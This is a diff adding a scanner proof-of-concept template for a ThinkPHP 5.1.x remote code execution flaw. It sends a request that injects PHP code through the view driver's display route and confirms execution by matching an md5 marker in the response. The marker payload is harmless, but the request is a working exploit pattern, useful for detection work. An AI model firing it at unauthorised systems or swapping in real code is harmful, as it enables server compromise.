@@ -1,0 +1,15 @@
+name: poc-yaml-thinkphp-driver-display-rce
+rules:
+  - method: GET
+    path: >-
+      /index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101
+        Firefox/71.0
+    follow_redirects: false
+    expression: |
+      response.status==200 && response.body.bcontains(b"56540676a129760a3") 
+detail:
+  author: megapyroblast
+  Affected Version: "ThinkPHP 5.1.X"
